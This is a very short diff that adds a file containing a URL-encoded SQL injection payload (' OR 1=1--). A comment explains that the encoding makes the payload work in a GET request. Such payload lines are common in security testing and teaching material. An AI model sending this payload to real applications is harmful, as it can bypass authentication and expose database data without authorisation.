@@ -1,0 +1,3 @@
+'+OR+1=1--
+
+# Note: URL encoding is used (+ instead of spaces) to ensure the payload works in a GET request.
